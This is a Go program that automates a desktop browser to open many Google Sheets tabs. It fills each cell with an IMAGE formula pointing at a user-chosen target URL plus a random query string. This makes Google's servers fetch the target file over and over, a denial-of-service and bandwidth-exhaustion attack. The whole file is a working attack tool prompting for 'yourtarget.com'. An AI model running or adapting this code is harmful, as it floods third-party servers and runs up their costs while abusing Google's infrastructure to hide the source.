package main

import (
	"fmt"
	"github.com/go-vgo/robotgo"
	"math/rand"
	"os/exec"
	"strconv"
	"time"
)

//openBrowser open browser on google sheets page
func openBrowser() bool {
	args := []string{"cmd", "/c", "start"}
	cmd := exec.Command(args[0], append(args[1:], "https://docs.google.com/spreadsheets/u/0/create?usp=sheets_home")...)
	return cmd.Start() == nil
}

//typing enter text to cell
func typing(site string) {
	robotgo.Sleep(20)
	for index := 0; index < /*50*/ 1; index++ {
		for index := 0; index < 20; index++ {
			for index := 0; index < 26; index++ {
				num := rand.Intn(100000)
				s := `=image("` + site + `?r=` + strconv.Itoa(num) + `")`
				robotgo.TypeString(s)
				robotgo.KeyTap("tab")
			}
			robotgo.KeyTap("down")
			robotgo.KeyTap("home")
			robotgo.Sleep(1)
		}
		robotgo.Sleep(20)
	}
	robotgo.Sleep(20)
}

//openNewTab open new google sheets page
func openNewTab() {
	robotgo.Sleep(5)
	robotgo.KeyToggle("control", "down")
	robotgo.KeyTap("t")
	robotgo.KeyToggle("control", "up")
	robotgo.TypeStringDelayed("https://docs.google.com/spreadsheets/u/0/create?usp=sheets_home", 300)
	robotgo.KeyTap("enter")
	robotgo.Sleep(20)
}

func main() {
	fmt.Println("EXAMPLE: http://yourtarget.com/image.png or http://yourtarget.com/info.pdf. Link to file is preferable")
	fmt.Printf("Set link: ")
	var s string
	fmt.Scanf("%s", &s)
	fmt.Printf("Set number of tabs: ")
	var tabs int
	fmt.Scan(&tabs)
	fmt.Println("You set: \n", "Link: ", s, "\n", "Number of tabs: ", tabs)
	time.Sleep(5 * time.Second)
	t := time.Now()
	fmt.Println(t)
	openBrowser()
	for index := 1; index < tabs; index++ {
		typing(s)
		openNewTab()
	}
	typing(s)
	fmt.Println(time.Since(t))
	fmt.Printf("DONE")
	time.Sleep(1 * time.Minute)
}
